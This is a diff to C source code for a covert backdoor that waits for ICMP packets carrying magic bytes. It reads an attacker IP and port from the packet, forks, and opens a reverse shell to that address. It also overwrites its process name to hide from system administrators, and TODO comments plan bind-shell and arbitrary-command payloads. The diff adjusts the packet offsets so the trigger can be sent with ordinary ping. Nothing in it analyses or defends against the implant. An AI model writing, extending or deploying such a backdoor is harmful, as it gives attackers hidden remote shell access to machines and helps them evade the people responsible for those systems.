@@ -11,7 +11,7 @@
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
-#include <netinet/in.h>
+#include <netinet/ip_icmp.h>
 
 
 /* You should change these */
@@ -32,8 +32,12 @@ int main(int argc, char *argv[]) {
   unsigned char		portstr[2];
   unsigned short	port;
   struct sockaddr_in	shell;
+  struct ip             *iphdr;
+  struct icmphdr        *icmphdr;
+  unsigned int          offset;
 
 
+  /* rename argv[0] to disguise ourselves from wack sysadmins */
   if (strlen(argv[0]) >= strlen(PARENTNAME)) {
     memset(argv[0], '\0', strlen(argv[0]));
     strcpy(argv[0], PARENTNAME);
@@ -48,27 +52,39 @@ int main(int argc, char *argv[]) {
     return EXIT_FAILURE;
   }
 
+  /* ip header(20) + icmp header(8) + timestamp(8) + 8 bytes added by ping */
+  offset = sizeof(struct ip) + sizeof(icmphdr) + 8 + 8;
+
   for (;;) {
     memset(buf, 0, sizeof(buf));
 
     n = recv(s, buf, sizeof(buf), 0);
+    // TODO: white/blacklists
+    iphdr = (struct ip *)buf;
+    // TODO: only act on echo requests
+    icmphdr = (struct icmphdr *)(buf + sizeof(struct ip));
+
     if (n > 51) {
       /* Check for magic bytes */
-      if (buf[50] != MAGIC1 || buf[51] != MAGIC2)
+      if (buf[offset + 6] != MAGIC1 || buf[offset + 7] != MAGIC2)
 	continue;
 
-      ip[0] = buf[44];
-      ip[1] = buf[45];
-      ip[2] = buf[46];
-      ip[3] = buf[47];
+      ip[0] = buf[offset];
+      ip[1] = buf[offset + 1];
+      ip[2] = buf[offset + 2];
+      ip[3] = buf[offset + 3];
 
-      portstr[0] = buf[48];
-      portstr[1] = buf[49];
+      portstr[0] = buf[offset + 4];
+      portstr[1] = buf[offset + 5];
 
       port = portstr[0] << 8 | portstr[1];
       sprintf(ipstr, "%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3]);
 
       if (fork() == 0) {
+        // TODO: other payloads
+        //  - bind shell
+        //  - execute arbitrary commands
+
 	/* Fairly standard reverse shell */
 	shell.sin_family = AF_INET;
 	shell.sin_port = htons(port);
